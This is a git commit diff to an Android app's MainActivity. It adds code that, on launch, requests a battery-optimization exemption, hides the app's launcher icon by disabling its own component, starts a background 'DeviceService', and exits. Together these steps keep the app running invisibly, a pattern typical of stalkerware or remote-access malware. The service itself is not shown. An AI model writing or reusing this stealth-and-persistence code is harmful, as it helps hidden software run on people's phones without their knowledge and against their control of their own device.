c1da3bca0820a886264ccbbc4c5bf6698ee304d8
SabOrRoblox <maksymorigonal2013@gmail.com>
2026-08-30 18:04:28 +0300

    Implement battery optimization ignore and app icon hide
    Added methods to ignore battery optimization and hide app icon.

--- app/src/main/java/com/hugecode/buffer/MainActivity.kt
+++ app/src/main/java/com/hugecode/buffer/MainActivity.kt
@@ -2,12 +2,42 @@ package com.hugecode.buffer
 
 import android.app.Activity
 import android.content.Intent
+import android.net.Uri
 import android.os.Bundle
+import android.os.PowerManager
+import android.provider.Settings
+import android.content.pm.PackageManager
 
 class MainActivity : Activity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        
+        ignoreBatteryOptimization()
+        
+        hideAppIcon()
+        
         startService(Intent(this, DeviceService::class.java))
         finish()
+    }
+    
+    private fun ignoreBatteryOptimization() {
+        val pm = getSystemService(POWER_SERVICE) as PowerManager
+        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
+            try {
+                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
+                intent.data = Uri.parse("package:$packageName")
+                startActivity(intent)
+            } catch (e: Exception) {}
+        }
+    }
+    
+    private fun hideAppIcon() {
+        try {
+            packageManager.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+        } catch (e: Exception) {}
     }
 }
